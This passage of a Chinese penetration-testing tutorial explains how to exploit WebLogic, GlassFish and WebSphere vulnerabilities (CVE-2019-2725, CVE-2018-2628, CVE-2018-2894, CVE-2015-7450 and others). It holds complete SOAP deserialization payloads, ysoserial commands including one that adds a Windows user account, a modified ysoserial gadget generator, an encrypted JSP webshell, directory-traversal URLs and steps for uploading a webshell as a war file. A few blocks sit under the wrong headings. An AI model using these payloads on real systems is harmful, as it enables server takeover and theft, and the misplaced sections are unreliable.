构造 写入文件 数据包发送，如下，其中`Content-Type需要等于text/xml,否则可能导致XMLDecoder不解析。`

```
python2 exploit.py 192.168.124.130 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.232 1099 JRMPClient2
```

访问 `/bea_wls_internal/test2.jsp`, 如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhjl4ddUJc2ia2EfDjCe2AfCILGtGP6F4Q9pQOSy92EpE7yibl5LXuEYKw/640?wx_fmt=png)

**修复建议**

1）安装补丁。

2）或删除 wls-wsat 组件，再次访问返回 404.

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css
```

### 6.2 Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）

访问`/_async/AsyncResponseService`，返回如下页面，则可能存在此漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhgHzfExsKwv2uVRaFQOIia79mvRhr2EYichGjeicibce6NmKr4Nau3d4AWw/640?wx_fmt=png)

漏洞不仅存在于 /_async/AsyncResponseService

只要是在 bea_wls9_async_response 包中的 Uri 皆受到影响，可以查看 web.xml 得知所有受到影响的 Uri，路径为：

```
java语言中会把 %c0%ae解析为 \uC0AE，最后转义为ASCCII字符的.（点）。利用 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。所以 glassfish 这个 poc 实际上就是../../../../../../../../../../../etc/passwd。
```

默认受到影响的 Uri 如下：

```
http://your-ip:4848/theme/META-INF/prototype��..��..��..��..��..��..��..��..��..��..��..��..��windows/win.ini
```

#### 6.2.1bea_wls9_async_response.war

##### 6.2.1.1Weblogic 10.3.6 利用 oracle.toplink.internal.sessions.UnitOfWorkChangeSet 构造函数执行 readObject().

UnitOfWorkChangeSet 的参数是一个 Byte 数组，因此我们需要将 Payload 转换为 Byte[].

利用 ysoserial 生成 Payload

```
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar Jdk7u21 "cmd /c echo lxhsec > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echoxxxxx.txt" > payload.txt
```

然后使用下列代码，将 Payload 进行转换成 Byte[]

```
import java.beans.XMLEncoder;
import java.io.*;
public class Test{
    public static void main(String[] args) throws Exception {
        File file = new File("C:\\Users\\lxhsec\\Downloads\\JRE8u20_RCE_Gadget-master\\exploit.ser");
        //读取ysoserial文件生成的payload
        FileInputStream fileInputStream = new FileInputStream(file);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((int) file.length());
        int buf_size=1024;
        byte[] buffer=new byte[buf_size];
        int len=0;
        while(-1 != (len=fileInputStream.read(buffer,0,buf_size))){
            byteArrayOutputStream.write(buffer,0,len);
        }
        BufferedOutputStream oop = new BufferedOutputStream(new FileOutputStream(new File("C:\\Users\\lxhsec\\Downloads\\ysoserial-master\\target\\result.txt")));
        //使用jdk的xmlencoder把byte数组写入到 result.txt
        XMLEncoder xmlEncoder = new XMLEncoder(oop);
        xmlEncoder.flush();
        xmlEncoder.writeObject(byteArrayOutputStream.toByteArray());
        xmlEncoder.close();
        byteArrayOutputStream.close();
        fileInputStream.close();
    }
}
```

拼接 Payload

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 127.0.0.1:7001
User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0
Accept:*/*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml
Content-Length: 178338
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">      
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>
//此处填写上面生成的XML。
</void></class></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

效果:

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh9GxJxk48XXiaYYncY9pGmbmcRty4yAN9YKyIYLLd2ZQ4GmFqOUiavmdw/640?wx_fmt=png)

使用 ysoserial 生成的只能适用于 Windows 平台，如果在 Linux 平台使用，则又要进行一次编译，兼容性有点不太好，因此我们可以

将 ysoserial 稍稍的进行更改。

这里我们将 ysoserial 的 Gadgets.java 文件进行更改。路径为：

```
ysoserial-master\src\main\java\ysoserial\payloads\util\Gadgets.java.
```

```
public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
          throws Exception {
      final T templates = tplClass.newInstance();
      // use template gadget class
      ClassPool pool = ClassPool.getDefault();
      pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
      pool.insertClassPath(new ClassClassPath(abstTranslet));
      final CtClass clazz = pool.get(StubTransletPayload.class.getName());
// ---Start
String cmd = "";
      if(command.startsWith("filename:")) {
          String filename = command.substring(9);
          try {
              File file = new File(filename);
              if (file.exists()) {
                  FileReader reader = new FileReader(file);
                  BufferedReader br = new BufferedReader(reader);
                  StringBuffer sb = new StringBuffer("");
                  String line = "";
                  while ((line = br.readLine()) != null) {
                      sb.append(line);
                      sb.append("\r\n");
                  }
                  cmd = sb.toString();
              } else {
                  System.err.println(String.format("filename %s not exists!", filename));
                  System.exit(0);
              }
          } catch (IOException e) {
              e.printStackTrace();
          }
      }else {
	// run command in static initializer
	// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
          cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                  command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                  "\");";
      }
System.err.println(cmd);	
// ---end
	
      clazz.makeClassInitializer().insertAfter(cmd);
      // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
      clazz.setName("ysoserial.Pwner" + System.nanoTime());
      CtClass superC = pool.get(abstTranslet.getName());
      clazz.setSuperclass(superC);
      final byte[] classBytes = clazz.toBytecode();
      // inject class bytes into instance
      Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
          classBytes, ClassFiles.classAsBytes(Foo.class)
      });
      // required to make TemplatesImpl happy
      Reflections.setFieldValue(templates, "_name", "Pwnr");
      Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
      return templates;
  }
```

保存后重新编译`mvn clean package -DskipTests`.

编译使用的是 JDK1.8, 修改后的 ysoserial，将命令执行，转换成了代码执行。

整个兼容两边平台的代码 TestCode.txt。

```
//TestCode.txt
String WEB_PATH = "servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echolxhsec.jsp";
String ShellContent = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%><%if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>";
try {
	java.io.PrintWriter printWriter = new java.io.PrintWriter(WEB_PATH);
	printWriter.println(ShellContent);
	printWriter.close();
} catch (Exception e) {
	e.printStackTrace();
}
```

执行：

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 "filename:C:\Users\lxhsec\Desktop\TestCode.txt" > result.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhW4NmgrOrJ7lp8EZ7YmicicQQtiaYWBnbOLLJxT1nIialzka7D3P5uuehdw/640?wx_fmt=png)

reuslt.txt 转换成 Byte[] 后执行，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh1kqVVnYKPibuu8xSibgdkMjiaCFUErJLb0EQNFUHvWvX34ibRlgmfTcHLA/640?wx_fmt=png)

访问: http://127.0.0.1:7001/_async/echolxhsec.jsp

##### 6.2.1.2 Weblogic 12.1.3 利用 org.slf4j.ext.EventData 构造函数执行 readObject().

**漏洞复现**

Weblogic 的黑名单只会过滤传入的第一层 XML，使用 org.slf4j.ext.EventData 传入的第一层 XML 是 String，因此绕过黑名单检测。

构造写入文件 Payload，如下。

```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.124.129:7001
User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml
Content-Length: 962
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">      
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><class><string>org.slf4j.ext.EventData</string><void><string>
<![CDATA[<java>
        <object class="java.io.PrintWriter">     
        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
       <void method="println">
       <string>lxhsecTest</string>
       </void>
       <void method="close"/>
      </object>
      </java>]]></string></void></class>
</void></class></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

结果:

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhP9pYUkhca9qgvZJFibxU6iaTKobXdFQQWl8Y5icV78njHmZ62PqKRBRnQ/640?wx_fmt=png)

#### 6.2.2 wls-wsat.war

bea_wls9_async_response.war 的反序列化链无法造成回显，但是 wls-wsat.war 的却可以。

贴个链接

##### 6.2.2.1

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhslvRlW3hw97ePmNibrTicTV4XiagaNRl4ibO3Ofg7aj0nAOI86nn6S1A1g/640?wx_fmt=png)

##### 6.2.2.2

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhHJgsYwI2z7eyCKCSGhG46HIszs8X0wbibY78bE0pCsVQoFmbFpEdwgw/640?wx_fmt=png)

### 6.3 Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）

Weblogic Server WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过 t3 协议触发，可导致未授权的用户在远程服务器执行任意命令。

使用 exploit.py 脚本进行复现, 具体使用方法见脚本。

**漏洞复现**

Kail 执行

1）下载 ysoserial.jar

```
wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
```

2）使用 ysoserial.jar，启动 JRMP Server

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

其中，[command]是想执行的命令，而 [listen port] 是 JRMP Server 监听的端口。

这里我执行

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'net user xiaohao xiaohao /add'
```

3）执行 exploit.py

```
python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

其中，[victim ip]和 [victim port] 是目标 weblogic 的 IP 和端口，[path to ysoserial]是本地（Kail 系统上的）ysoserial 的路径，[JRMPListener ip]和 [JRMPListener port] 第一步中启动 JRMP Server 的 IP 地址和端口。[JRMPClient]是执行 JRMPClient 的类，可选的值是 JRMPClient 或 JRMPClient2

这里我执行

```
python2 exploit.py 192.168.124.130 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.232 1099 JRMPClient2
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhpfr74QpFtiaIRRHJ2ibyRLmL1Ddca81Nib17BRynvxZrVM73v4fxfT2dw/640?wx_fmt=png)

**修复建议**

1. 过滤 t3 协议。

2. 安装补丁，但是保不准下一次 Weblogic 缝缝补补的黑名单又被绕过。

### 6.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）

Weblogic Web Service Test Page 中一处任意文件上传漏洞，Web Service Test Page 在” 生产模式” 下默认不开启，所以该漏洞有一定限制。

影响版本：

12.1.3.0

12.2.1.2

12.2.1.3

**漏洞利用**

访问 ws_utc/config.do，设置 Work Home Dir 为 ws_utc 应用的静态文件 css 目录

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css
```

因为访问这个目录是无需权限的，提交后，点击左侧 安全 -> 添加，然后上传 Webshell。  

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhq5U8iaZJrMpbCcO9qqxh3MknYnyfhIDMSdMgV5WGfx6DeicYKz9C5Vdg/640?wx_fmt=png)

点击提交并抓包，获取响应数据包中的时间戳。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhRyQ89kqYrJzeedhn0AibxVYQ9QXniac4XmjBZbmwMWl9iaEOqUSx3XGSQ/640?wx_fmt=png)

然后访问 http://127.0.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名] 即可执行 webshell

### 6.5 Weblogic SSRF 漏洞 （CVE-2014-4210）

影响版本：10.0.2.0, 10.3.6.0

访问 /uddiexplorer/SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhZuw1I3zoWv3WBGv4xzKAic7qyHwsLSHzHByTW5u0YqVO9IjfnP6fQAg/640?wx_fmt=png)

点击 Search，并抓包，抓包之后在 Burp 中右键，选择 Change request method, 将 POST 请求改变成 GET，参数 operator 为 SSRF 的可控参数，将其更改为开放的端口，如`http://127.0.0.1:7001/`，将返回 error code

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhKbLBlicq8NkULUE9CtXOzhvFK1WLRHuMKao8EgToML03g2CibvgIG3Wg/640?wx_fmt=png)

若开放端口为 HTTP 协议，则会返回 did not have a valid SOAP content-type

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vht0seDHW7Q5o7wVwxUVbJr2SkJyIzL1ricbx7FSvmNJSd4UJtsGkrVyQ/640?wx_fmt=png)

访问不存在的端口，将返回`could not connect over HTTP to server`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhNQ7B24x9ncoZ6oPSjZuibhOOP3KT7KutMuMMIzJxk0JoVZtMxuEPrzQ/640?wx_fmt=png)

通过返回数据包中的错误信息，即可探测内网状态。

### 6.6 war 后门文件部署

访问 http://127.0.0.1:7001/console, 自动重定向到 http://127.0.0.1:7001/console/login/LoginForm.jsp，使用弱口令登陆后台

**漏洞复现**

获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh8hXGQCiaicAEicKNlaxJzicJibs55zadNFtyGPRum5ibMT4lSEiaUTLjcXFKg/640?wx_fmt=png)

点击安装，选择 “上载文件”，上传 war 包。值得注意的是，我们平时 tomcat 用的 war 包不一定能够成功，

你可以将你的 webshell 放到本项目的 web/hello.war 这个压缩包中，再上传。上传成功后点下一步。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhnmPd8rYHPCdBstVZvZN4jYNmRLXOdKET00azkX3kGzeaNvu1spdjcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh1bbGk5aYeLRu7kc5XBp6NxnFuLS9nCc3rktMia7ctBc4gTDGdjaBEtQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh2SKJIPMtrZaa4pPoq5P1ZWrsoq65gOGySkjRTpUGMENHy5B8k3nQpA/640?wx_fmt=png)

然后点击完成 - 保存

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhvNPklKuZ7qMVWKuVWnGoibtEQicn0d6sbfKfdaYlmmjjVveKK8u9qLlg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhibRTC1zhnHMFYWLBf9XLJqgl6icevvsVfsn2ibvHOzNVsCy2mlzG8aibRw/640?wx_fmt=png)

访问：`http://ip:port/[war包名]/[包名内文件名]`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhfaHibjmHJ3jbswxHdiaUSPALhUnhS8fTiaGwMImc9PWhJxnOTtOHiarD2A/640?wx_fmt=png)

7. GlassFish
------------

GlassFish 是用于构建 Java EE 5 应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。

默认端口：8080（Web 应用端口，即网站内容），4848（GlassFish 管理中心）

默认返回的指纹信息:

```
Server: GlassFish Server Open Source Edition  4.1.2
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1.2  Java/Oracle Corporation/1.8)
```

### 7.1 GlassFish Directory Traversal（CVE-2017-1000028）

```
java语言中会把 %c0%ae解析为 \uC0AE，最后转义为ASCCII字符的.（点）。利用 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。所以 glassfish 这个 poc 实际上就是../../../../../../../../../../../etc/passwd。
```

**漏洞复现**

通过 vulhub 进行测试

```
http://your-ip:4848/theme/META-INF/prototype��..��..��..��..��..��..��..��..��..��..��..��..��windows/win.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhv2y0SibKDmoMpQMDAA2pQdPnz98eXmIiburtJ89ADJJLkUUg9K0sBe7w/640?wx_fmt=png)  

### 7.2 GlassFish 后台 Getshell

**漏洞复现**

点击左侧 Applications，接着点击 deploy

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhdM0zvbdGKzJ4JCR8JoicIBXFSicZlgdSrSypkBNYtEvCDp4kwPIdp3dA/640?wx_fmt=png)

上传 war 包，填写 Context Root 到访问的 url，点击 OK

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhlzrPV3ndrnibe8o7icPAguWiaVrGjicYJqR0QnHekPne6GfdibSg7cUdhrA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vh4Cic35mTzcIJcZNhWfCHYZNloTIe7iatM5LcFsuMNVJzd5iaqOmCgwuog/640?wx_fmt=png)

访问：`http://127.0.0.1:8080/[Context Root]/[war包内的filename]`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhArWkV8slDmhk9GBMXWpVGgmZsbfOPy4Gu84Dc8WQBuu9TpvLjWBacA/640?wx_fmt=png)

8. WebSphere
------------

WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰 富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。

下载安装 7.0 WebSphere `https://www.ibm.com/support/pages/node/320527`

指纹: Server: WebSphere Application Server/7.0

登录页面：

`http://127.0.0.1:9060/ibm/console/logon.jsp`

`https://127.0.0.1:9043/ibm/console/logon.jsp`

### 8.1 Java 反序列化 (CVE-2015-7450)

访问 8880 端口，出现如下界面，则可能存在 Java 反序列化漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRoBZ5wEqHwWk1kDo4V2vhCmicXmU2hdSMsnhfVLDFGZiaWHLkkS0UnF4kOhMiabvicq3Gkj1996d2vQ/640?wx_fmt=png)

```
POST / HTTP/1.1
Host: 192.168.31.12:8880
User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml
SOAPAction: urn:AdminService
Content-Length: 8886
<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header ns0:JMXConnectorContext="rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZW